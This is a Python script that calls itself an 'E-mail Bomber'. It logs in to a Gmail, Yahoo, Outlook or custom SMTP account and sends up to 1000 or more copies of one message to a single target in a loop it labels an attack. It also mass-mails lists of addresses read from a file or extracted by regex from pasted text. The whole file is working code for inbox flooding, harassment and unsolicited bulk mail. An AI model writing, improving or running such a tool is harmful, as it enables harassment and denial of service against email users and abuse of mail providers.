
import smtplib
import sys
import pyperclip
import os
import re


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    purple = '#A020F0'



class banner:
    print(bcolors.RED +'******E-mail')
    print(bcolors.RED +'************BOMBER')
    print(bcolors.RED + 'built with python  ')
    print(bcolors.RED + '''

                __________________________s$______________s
            _________________________.s$$_____________s$
            ________________________s$$$____________s$$
            ______________________.s$$$_______,___s$$
            _____________________s$$$$______.s$___$$
            ________________,____$$$$$.______s$____$
            ________________$___$$$$$$s_____s$_____,
            _______________s$___$$$$$$s___$$$
            _______________$$____$$$$$$s.__$$s
            _______________$.____$$$$$$$s_.s$$$____s
            _______________`$$.____$$$$$$$_$$$$___s
            ________________$$s____$$$$$$s$$$__s$
            _________________$$s____$$$$$s$$$$__s$$
            _____________`s.__$$$$___s$$$$$$$$_.s$$__s
            ______________$$_s$$$$..s$$$$$$$$$$$$$$__s$
            ______________s$.s$$$$s$$$$$$$$$$$$$$$$_s$$
            _____________s$$$$$$$$$$$$$$$$$$$$$$$$$$$
            ____________s$$$sssss$$- ULLAS -$$ssss$$$
            ___________$$s&&&&&&&&&$ RAVI $&&&&&&&s$,
            ___________&&&&&&&&&&&&  SAMBID &&&&&&&&&,
            ___________&&&&&&&&&&&&& TARUN &&&&&&&&&&
            ___________&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
            ____________&&&&&&&&&&&&&&&&&&&&&&&&&&&
            _____________&&&&&&&&&&&&&&&&&&&&&&&&&
            ______________&&&&&&&&&&&&&&&&&&&&&&&
            ________________&&&&&&&&&&&&&&&&&&&
            __________________&&&&&&&&&&&&&&&
            ____________________&&&&&&&&&&&
            _______________________&&&&&
            _________________________&


        ''')



class Email_Bomber:
    count = 0
    flag = 0
    

    def __init__(self, x):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            if x == 2 :
                Email_Bomber.flag = 1
            if x == 1:
                self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
                self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
                if int(self.mode) > int(4) or int(self.mode) < int(1):
                    print('ERROR: Invalid Option. GoodBye.')
                    sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')




    def bomb(self):
        try:
           
            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                    self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
                print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n\n+[+[+[ Setting up email ]+]+]+')
            if Email_Bomber.flag == 1:
                self.amount = int(input(bcolors.RED+ 'Choose a n amount <: '))
                print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: Mass mailing and {self.amount} emails ]+]+]+')
           
            self.server = str(input(bcolors.GREEN + '\nEnter email server | or select premade options - \n1:Gmail \n2:Yahoo \n3:Outlook \n---> '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp.office365.com'
            
            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
            ss = str(input("copy the password to paperclip"))
            self.fromPwd = pyperclip.paste()
            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
            self.message = str(input(bcolors.GREEN + 'Enter message <: '))
            if Email_Bomber.flag == 0:
                self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)







    def sendall(self):
        try:
            print(bcolors.YELLOW + '****enter the path of the file with email list***')
            path = str(input('path enter---> '))
            filee = open( path , 'r')
           
            for list_mail in filee.readlines():
                list_mail = str(list_mail.strip('\n'))
                try:
                    self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                        ''' % (self.fromAddr, list_mail, self.subject, self.message)
                    self.s.sendmail(self.fromAddr, list_mail, self.msg)
                    print(bcolors.RED + f'sent to %s' %(list_mail))
                
                except Exception as e:
                        print(f'inner ERROR: {e}')
            filee.close()
        except Exception as e:
            print('this is outer exception file error')
    


    def regex_email(self, yyy):
        emailRegex = re.compile(r'''(
        [a-zA-Z0-9._%+-]+ # username
        @ # @ symbol
        [a-zA-Z0-9.-]+ # domain name
        (\.[a-zA-Z]{2,4}) # dot-somethin

        )''', re.VERBOSE)
        matches = []
        for groups in emailRegex.findall(yyy):
            matches.append(groups[0])
        print('the email extracted are::::')
        i = 0
        for mail in matches:
            i = i +1 
            print(f'{i} {mail}',)
        print('1. all mails')
        print('2. select mail no')
        option = int(input('select --> '))
        if option == 1:
            for mail in matches:
                list_mail = str(mail)
                try:
                    self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                        ''' % (self.fromAddr, list_mail, self.subject, self.message)
                    self.s.sendmail(self.fromAddr, list_mail, self.msg)
                    print(bcolors.RED + f'sent to %s' %(list_mail))
                
                except Exception as e:
                        print(f'inner ERROR: {e}')
        else :
            print(bcolors.RED + 'select the mails as sl no  and -1 to exit')
            l = []
            while True:
                x = int(input('enter sl no'))
                if x == -1:
                    break
                l.append(matches[x-1])
            for mail in l:
                
                list_mail = str(mail)
                try:
                    self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                        ''' % (self.fromAddr, list_mail, self.subject, self.message)
                    self.s.sendmail(self.fromAddr, list_mail, self.msg)
                    print(bcolors.RED + f'sent to %s' %(list_mail))
                
                except Exception as e:
                        print(f'inner ERROR: {e}')

            
        

        
        
        


if __name__=='__main__':
    banner()
    while(True):
        print('1.Bomb\n2.send email to masses\n3.extract mail from text and send mail')
        x = int(input('enter'))
        
        if x >= 1 and x <= 3 :
            if x == 1:
                bomb = Email_Bomber(x)
                Email_Bomber.flag = 0
                bomb.bomb()
                bomb.email()
                bomb.attack()
                input('press any char to exit')
                os.system('cls')
                exit(0)
            elif x == 2:
                bomb = Email_Bomber(x)
                #bomb.bomb()
                bomb.email()
                bomb.sendall()
                input('press any char to exit')
                os.system('cls')
                exit(0)
            elif x == 3:
                Email_Bomber.flag = 55
                bomb = Email_Bomber(x)
                bomb.email()
                y = input('copy the text which you want to scan and press enter ')
                yyy = str(pyperclip.paste())
                bomb.regex_email(yyy)
                print(bcolors.GREEN +'sent to all emails !!')
            



    